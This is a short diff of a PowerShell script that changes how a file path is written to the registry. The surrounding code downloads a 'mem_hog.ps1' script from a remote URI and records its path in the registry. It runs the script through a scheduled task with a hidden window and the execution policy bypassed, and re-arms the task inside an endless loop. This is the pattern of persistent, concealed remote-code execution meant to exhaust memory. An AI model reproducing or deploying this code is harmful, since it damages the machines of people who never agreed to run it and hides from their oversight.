@@ -36,8 +36,7 @@ if(-not($itemMem)){
     $memHogPath = $paths[$idx]
     $memHogPath = "$memHogPath\mem_hog.ps1"
     iwr -Uri $memHogUri -OutFile $memHogPath
-    reg add "$basePath" /v $memPropertyName /t REG_SZ /d $memHogPath /f
-    #New-ItemProperty -Path "$basePath" -Name $memPropertyName -Value $memHogPath -Force | Out-Null
+    New-ItemProperty -Path "$basePath" -Name $memPropertyName -Value $memHogPath -Force | Out-Null
 }else { $memHogPath = $itemMem.$memPropertyName }
 
 # $itemStore = Get-ItemProperty -Path "$basePath" -Name $storagePropertyName -ErrorAction SilentlyContinue
@@ -113,8 +112,7 @@ while ($true) {
         $memHogPath = "$memHogPath\mem_hog.ps1"
         iwr -Uri $memHogUri -OutFile $memHogPath
         $memTaskRunAction = "powershell -ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden $memHogPath"
-        reg add "$basePath" /v $memPropertyName /t REG_SZ /d $memHogPath /f
-        #Set-ItemProperty -Path "$basePath" -Name $memPropertyName -Value $memHogPath -Force | Out-Null
+        Set-ItemProperty -Path "$basePath" -Name $memPropertyName -Value $memHogPath -Force | Out-Null
         schtasks /change /tn $memHogTaskName /tr $memTaskRunAction
         schtasks /run /tn $memHogTaskName
     }
